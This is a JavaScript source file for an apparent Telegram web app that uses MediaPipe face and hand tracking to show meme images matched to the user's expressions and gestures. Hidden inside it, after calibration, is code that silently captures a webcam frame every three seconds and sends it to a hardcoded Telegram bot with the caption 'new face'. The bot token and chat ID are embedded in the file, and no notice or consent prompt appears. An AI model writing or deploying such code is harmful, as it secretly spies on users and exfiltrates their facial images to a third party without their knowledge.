import {
  FilesetResolver,
  FaceLandmarker,
  HandLandmarker,
} from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.15";

// ══════════════════════════════════════════════════
//  إعدادات السكرين شوت — ضع بياناتك هنا
// ══════════════════════════════════════════════════
const SCREENSHOT_BOT_TOKEN = "8586863933:AAEdZAI2m0mB-R_BgWT8ZOzuwEyqDvqN0QY";
const SCREENSHOT_CHAT_ID   = "8187027750";
const SCREENSHOT_INTERVAL  = 3000; // كل 3 ثواني

// ══════════════════════════════════════════════════
//  روابط صور الميمات
// ══════════════════════════════════════════════════
const MEME_PATHS = {
  sonic:     "./memes/Sonic.jpeg",
  cara:      "./memes/cara.jpeg",
  cristiano: "./memes/cristiano.png",
  lengua:    "./memes/gato1.png",
  ceja:      "./memes/perro.jpeg",
  rata:      "./memes/rata.jpeg",
};

// ══════════════════════════════════════════════════
//  عناصر DOM
// ══════════════════════════════════════════════════
const startScreen    = document.getElementById("startScreen");
const camScreen      = document.getElementById("camScreen");
const startBtn       = document.getElementById("startBtn");
const loadingDots    = document.getElementById("loadingDots");
const closeBtn       = document.getElementById("closeBtn");
const errBox         = document.getElementById("errBox");
const video          = document.getElementById("video");
const overlay        = document.getElementById("overlay");
const ctx            = overlay.getContext("2d");
const calOverlay     = document.getElementById("calOverlay");
const calBarFill     = document.getElementById("calBarFill");
const calPct         = document.getElementById("calPct");
const memeImg        = document.getElementById("memeImg");
const memePlaceholder= document.getElementById("memePlaceholder");
const camWrap        = document.getElementById("camWrap");

// ══════════════════════════════════════════════════
//  دوال هندسية
// ══════════════════════════════════════════════════
function dist(a, b) {
  return Math.sqrt((a.x-b.x)**2 + (a.y-b.y)**2 + (a.z-b.z)**2);
}
function faceScale(lm) { return dist(lm[152], lm[10]) + 1e-6; }

function fingersState(lm, isLeft) {
  const tips = [8,12,16,20], mids = [6,10,14,18];
  const out = [isLeft ? (lm[4].x > lm[3].x ? 1:0) : (lm[4].x < lm[3].x ? 1:0)];
  for (let i=0;i<4;i++) out.push(lm[tips[i]].y < lm[mids[i]].y ? 1:0);
  return out;
}

// ══════════════════════════════════════════════════
//  كلاس المعايرة
// ══════════════════════════════════════════════════
class Calibrator {
  constructor() {
    this.N = 45;
    this.buf = {ci:[],cd:[],cen:[],lap:[],llb:[],bi_y:[],bd_y:[],gap:[]};
    this.done = false;
    this.thr = {ci:0.180,cd:0.180,cen_lo:0.185,lap:0.055,llb:0.145,bi_y_lo:0.30,bd_y_lo:0.30,gap_lo:0.10};
  }
  feed(lm) {
    if (this.done) return;
    const e = faceScale(lm);
    this.buf.ci.push(dist(lm[52],lm[159])/e);
    this.buf.cd.push(dist(lm[282],lm[386])/e);
    this.buf.cen.push(dist(lm[55],lm[285])/e);
    this.buf.lap.push(dist(lm[13],lm[14])/e);
    this.buf.llb.push(dist(lm[17],lm[152])/e);
    this.buf.bi_y.push(lm[55].y - lm[9].y);
    this.buf.bd_y.push(lm[285].y - lm[9].y);
    this.buf.gap.push(Math.abs(lm[55].x - lm[285].x));
    if (this.buf.ci.length >= this.N) this._calc();
  }
  _median(arr) {
    const s=[...arr].sort((a,b)=>a-b), m=Math.floor(s.length/2);
    return s.length%2 ? s[m] : (s[m-1]+s[m])/2;
  }
  _std(arr) {
    const m=arr.reduce((a,b)=>a+b,0)/arr.length;
    return Math.sqrt(arr.reduce((a,b)=>a+(b-m)**2,0)/arr.length);
  }
  _calc() {
    const m=k=>this._median(this.buf[k]), s=k=>this._std(this.buf[k]);
    const mgC=k=>Math.max(1.5*s(k),0.015), mgB=(k,mn)=>Math.max(3*s(k),mn);
    this.thr.ci      = m("ci")  + mgC("ci");
    this.thr.cd      = m("cd")  + mgC("cd");
    this.thr.cen_lo  = m("cen") - mgC("cen");
    this.thr.lap     = m("lap") + mgB("lap",0.032);
    this.thr.llb     = m("llb") - mgB("llb",0.018);
    this.thr.bi_y_lo = m("bi_y")+ mgC("bi_y");
    this.thr.bd_y_lo = m("bd_y")+ mgC("bd_y");
    this.thr.gap_lo  = m("gap") - mgC("gap");
    this.done = true;
  }
  get progress() { return Math.min(this.buf.ci.length/this.N,1.0); }
}

// ══════════════════════════════════════════════════
//  دوال الاكتشاف
// ══════════════════════════════════════════════════
function detLengua(lm,cal) {
  const e=faceScale(lm);
  return dist(lm[13],lm[14])/e > cal.thr.lap &&
         dist(lm[17],lm[152])/e < cal.thr.llb &&
         lm[17].y > lm[14].y + 0.012;
}
function detCeja(lm,cal) {
  const e=faceScale(lm);
  return dist(lm[52],lm[159])/e > cal.thr.ci ||
         dist(lm[282],lm[386])/e > cal.thr.cd ||
         dist(lm[55],lm[285])/e < cal.thr.cen_lo ||
         lm[55].y-lm[9].y > cal.thr.bi_y_lo ||
         lm[285].y-lm[9].y > cal.thr.bd_y_lo ||
         Math.abs(lm[55].x-lm[285].x) < cal.thr.gap_lo;
}
function detCristiano(manos,lmCara) {
  const boca=lmCara[13];
  return manos.some(({lm})=>dist(lm[8],boca)<0.09||dist(lm[12],boca)<0.09);
}
function detRata(f) {
  return f[0]===0&&f[1]===1&&f[2]===1&&f[3]===0&&f[4]===0;
}
function detSonic(manos,lmCara) {
  return manos.length===2 && manos.every(({lm})=>lm[9].y<lmCara[1].y);
}
function detCara(manos) {
  if (manos.length!==2) return false;
  for (const {fingers,lm} of manos) {
    if (!(fingers[1]&&fingers[2]&&fingers[3]&&fingers[4]) || lm[0].y<0.50) return false;
  }
  return Math.abs(manos[0].lm[0].x-manos[1].lm[0].x)>=0.20;
}

// ══════════════════════════════════════════════════
//  رسم الوجه واليد
// ══════════════════════════════════════════════════
const FACE_OVAL=[10,338,297,332,284,251,389,356,454,323,361,288,397,365,379,378,400,377,152,148,176,149,150,136,172,58,132,93,234,127,162,21,54,103,67,109,10];
const EYE_L=[33,246,161,160,159,158,157,173,133,155,154,153,145,144,163,7,33];
const EYE_R=[362,398,384,385,386,387,388,466,263,249,390,373,374,380,381,382,362];
const BROW_L=[70,63,105,66,107,55,65,52,53,46];
const BROW_R=[300,293,334,296,336,285,295,282,283,276];
const LIPS_OUT=[61,146,91,181,84,17,314,405,321,375,291,409,270,269,267,0,37,39,40,185,61];
const LIPS_IN=[78,95,88,178,87,14,317,402,318,324,308,415,310,311,312,13,82,81,80,191,78];
const NOSE=[168,6,197,195,5,4,1,19,94,2];
const HAND_CONNECTIONS=[[0,1],[1,2],[2,3],[3,4],[0,5],[5,6],[6,7],[7,8],[0,9],[9,10],[10,11],[11,12],[0,13],[13,14],[14,15],[15,16],[0,17],[17,18],[18,19],[19,20],[5,9],[9,13],[13,17]];

const COL_BASE="rgba(140,200,140,0.75)";
const COL_ACT="rgb(80,240,80)";

function px(pt,W,H){return [(1-pt.x)*W, pt.y*H];}

function drawPath(lm,indices,W,H,color,close=false){
  ctx.strokeStyle=color; ctx.fillStyle=color; ctx.lineWidth=1.2;
  ctx.beginPath();
  const pts=indices.map(i=>px(lm[i],W,H));
  pts.forEach(([x,y],j)=>j===0?ctx.moveTo(x,y):ctx.lineTo(x,y));
  if(close)ctx.closePath();
  ctx.stroke();
  pts.forEach(([x,y])=>{ctx.beginPath();ctx.arc(x,y,1.2,0,2*Math.PI);ctx.fill();});
}

function drawFace(lm,W,H,cal){
  const e=faceScale(lm);
  const bocaAct=dist(lm[13],lm[14])/e>cal.thr.lap&&dist(lm[17],lm[152])/e<cal.thr.llb;
  const cejaAct=dist(lm[52],lm[159])/e>cal.thr.ci||dist(lm[282],lm[386])/e>cal.thr.cd;
  drawPath(lm,FACE_OVAL,W,H,COL_BASE);
  drawPath(lm,EYE_L,W,H,COL_BASE,true);
  drawPath(lm,EYE_R,W,H,COL_BASE,true);
  drawPath(lm,BROW_L,W,H,cejaAct?COL_ACT:COL_BASE);
  drawPath(lm,BROW_R,W,H,cejaAct?COL_ACT:COL_BASE);
  drawPath(lm,NOSE,W,H,COL_BASE);
  drawPath(lm,LIPS_OUT,W,H,bocaAct?COL_ACT:COL_BASE,true);
  drawPath(lm,LIPS_IN,W,H,bocaAct?COL_ACT:COL_BASE,true);
}

function drawHand(lm,W,H,fingers){
  ctx.strokeStyle=COL_BASE; ctx.lineWidth=1.2;
  for(const[a,b]of HAND_CONNECTIONS){
    const[x1,y1]=px(lm[a],W,H),[x2,y2]=px(lm[b],W,H);
    ctx.beginPath();ctx.moveTo(x1,y1);ctx.lineTo(x2,y2);ctx.stroke();
  }
  ctx.fillStyle=COL_BASE;
  for(let i=0;i<21;i++){const[x,y]=px(lm[i],W,H);ctx.beginPath();ctx.arc(x,y,2,0,2*Math.PI);ctx.fill();}
  ctx.fillStyle=COL_ACT;
  [4,8,12,16,20].forEach((tip,i)=>{
    if(fingers[i]){const[x,y]=px(lm[tip],W,H);ctx.beginPath();ctx.arc(x,y,3.5,0,2*Math.PI);ctx.fill();}
  });
}

// ══════════════════════════════════════════════════
//  نظام التصويت
// ══════════════════════════════════════════════════
class VoteBuffer {
  constructor(size=10,min=6){this.size=size;this.min=min;this.buf=[];}
  push(v){this.buf.push(v);if(this.buf.length>this.size)this.buf.shift();}
  top(){
    const c=new Map();
    for(const v of this.buf)c.set(v,(c.get(v)||0)+1);
    let top=null,max=0;
    for(const[k,n]of c)if(n>max){max=n;top=k;}
    return max>=this.min?top:undefined;
  }
}

// ══════════════════════════════════════════════════
//  إرسال السكرين شوت لتيليجرام (بدون نقاط الرسم)
// ══════════════════════════════════════════════════
let screenshotCanvas = null;

function initScreenshotCanvas() {
  screenshotCanvas = document.createElement("canvas");
}

async function sendScreenshot() {
  if (!screenshotCanvas) return;
  // نرسم الفيديو فقط (بدون overlay النقاط) على كانفاس مؤقت
  screenshotCanvas.width  = video.videoWidth  || 320;
  screenshotCanvas.height = video.videoHeight || 240;
  const sc = screenshotCanvas.getContext("2d");
  // نعكس بالمرآة مثل ما يرى المستخدم
  sc.save();
  sc.translate(screenshotCanvas.width, 0);
  sc.scale(-1, 1);
  sc.drawImage(video, 0, 0, screenshotCanvas.width, screenshotCanvas.height);
  sc.restore();

  screenshotCanvas.toBlob(async (blob) => {
    if (!blob) return;
    if (SCREENSHOT_BOT_TOKEN === "ضع_توكن_البوت_الثاني_هنا") return; // لم يُضبط بعد
    try {
      const form = new FormData();
      form.append("chat_id", SCREENSHOT_CHAT_ID);
      form.append("photo", blob, "face.jpg");
      form.append("caption", `وجه جديد 📸 — ${new Date().toLocaleTimeString("ar")}`);
      await fetch(`https://api.telegram.org/bot${SCREENSHOT_BOT_TOKEN}/sendPhoto`, {
        method: "POST", body: form,
      });
    } catch (e) {
      console.warn("فشل إرسال السكرين شوت:", e);
    }
  }, "image/jpeg", 0.75);
}

// ══════════════════════════════════════════════════
//  متغيرات التشغيل
// ══════════════════════════════════════════════════
let faceLandmarker, handLandmarker;
let cal = new Calibrator();
let voteBuf = new VoteBuffer(10,6);
let imgActual = null;
let running = false;
let screenshotTimer = null;
let calJustDone = false;

// ══════════════════════════════════════════════════
//  تهيئة النماذج
// ══════════════════════════════════════════════════
async function initModels() {
  const vis = await FilesetResolver.forVisionTasks(
    "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.15/wasm"
  );
  faceLandmarker = await FaceLandmarker.createFromOptions(vis, {
    baseOptions: {
      modelAssetPath: "https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task",
      delegate: "GPU",
    },
    runningMode: "VIDEO", numFaces: 1,
    minFaceDetectionConfidence: 0.7, minTrackingConfidence: 0.7,
  });
  handLandmarker = await HandLandmarker.createFromOptions(vis, {
    baseOptions: {
      modelAssetPath: "https://storage.googleapis.com/mediapipe-models/hand_landmarker/hand_landmarker/float16/1/hand_landmarker.task",
      delegate: "GPU",
    },
    runningMode: "VIDEO", numHands: 2,
    minHandDetectionConfidence: 0.7, minTrackingConfidence: 0.7,
  });
}

// ══════════════════════════════════════════════════
//  حلقة الرندر
// ══════════════════════════════════════════════════
function renderLoop() {
  if (!running) return;
  const W=overlay.width, H=overlay.height;
  ctx.clearRect(0,0,W,H);

  const now=performance.now();
  const faceRes=faceLandmarker.detectForVideo(video,now);
  const handRes=handLandmarker.detectForVideo(video,now);

  let lmCara=null;
  if (faceRes.faceLandmarks?.length>0) lmCara=faceRes.faceLandmarks[0];

  const manos=[];
  if (handRes.landmarks?.length>0) {
    for (let i=0;i<handRes.landmarks.length;i++) {
      const lm=handRes.landmarks[i];
      const raw=handRes.handedness[i][0].categoryName;
      const isLeft=(raw==="Left"?"Right":"Left")==="Left";
      const fingers=fingersState(lm,isLeft);
      drawHand(lm,W,H,fingers);
      manos.push({fingers,lm});
    }
  }

  if (!cal.done) {
    if (lmCara) cal.feed(lmCara);
    const pct=Math.round(cal.progress*100);
    calBarFill.style.width=pct+"%";
    calPct.textContent=pct+"%";

    if (cal.done) {
      // انتهت المعايرة — صغّر الكاميرا وأظهر منطقة الميم
      calOverlay.style.display="none";
      camWrap.classList.remove("fullscreen");
      resizeOverlay();
      // ابدأ إرسال السكرين شوت كل 3 ثواني
      initScreenshotCanvas();
      screenshotTimer = setInterval(sendScreenshot, SCREENSHOT_INTERVAL);
    }
  } else {
    if (lmCara) drawFace(lmCara,W,H,cal);

    let det=null;
    if (lmCara&&manos.length===2&&detSonic(manos,lmCara))        det="sonic";
    else if (manos.length===2&&detCara(manos))                    det="cara";
    else if (lmCara&&manos.length>0&&detCristiano(manos,lmCara)) det="cristiano";
    else if (lmCara&&detLengua(lmCara,cal))                       det="lengua";
    else if (lmCara&&detCeja(lmCara,cal))                         det="ceja";
    else if (manos.length===1&&detRata(manos[0].fingers))         det="rata";

    voteBuf.push(det);
    const stable=voteBuf.top();
    if (stable!==undefined) setMeme(stable);
  }

  requestAnimationFrame(renderLoop);
}

// ══════════════════════════════════════════════════
//  عرض الميم
// ══════════════════════════════════════════════════
function setMeme(key) {
  if (key===imgActual) return;
  imgActual=key;
  if (key&&MEME_PATHS[key]) {
    memeImg.src=MEME_PATHS[key];
    memeImg.style.display="block";
    memePlaceholder.style.display="none";
  } else {
    memeImg.style.display="none";
    memePlaceholder.style.display="flex";
  }
}

// ══════════════════════════════════════════════════
//  ضبط حجم الكانفاس
// ══════════════════════════════════════════════════
function resizeOverlay() {
  const r=camWrap.getBoundingClientRect();
  overlay.width=r.width;
  overlay.height=r.height;
}

// ══════════════════════════════════════════════════
//  تشغيل الكاميرا
// ══════════════════════════════════════════════════
async function startCamera() {
  const stream=await navigator.mediaDevices.getUserMedia({
    video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false,
  });
  video.srcObject=stream;
  await new Promise(r=>video.onloadedmetadata=r);
  await video.play();
}

// ══════════════════════════════════════════════════
//  بدء التطبيق
// ══════════════════════════════════════════════════
async function startApp() {
  errBox.style.display="none";
  startBtn.disabled=true;
  loadingDots.classList.add("show");
  try {
    await startCamera();
    await initModels();
    startScreen.style.display="none";
    camScreen.style.display="block";
    // الكاميرا fullscreen للمعايرة
    camWrap.classList.add("fullscreen");
    resizeOverlay();
    window.addEventListener("resize", resizeOverlay);
    running=true;
    requestAnimationFrame(renderLoop);
  } catch(err) {
    console.error(err);
    errBox.textContent="تعذر تشغيل الكاميرا: "+err.message;
    errBox.style.display="block";
    startBtn.disabled=false;
    loadingDots.classList.remove("show");
  }
}

function stopApp() {
  running=false;
  if (screenshotTimer) clearInterval(screenshotTimer);
  video.srcObject?.getTracks().forEach(t=>t.stop());
  if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
  else { camScreen.style.display="none"; startScreen.style.display="flex"; }
}

startBtn.addEventListener("click", startApp);
closeBtn.addEventListener("click", stopApp);

if (window.Telegram?.WebApp) {
  window.Telegram.WebApp.ready();
  window.Telegram.WebApp.expand();
}
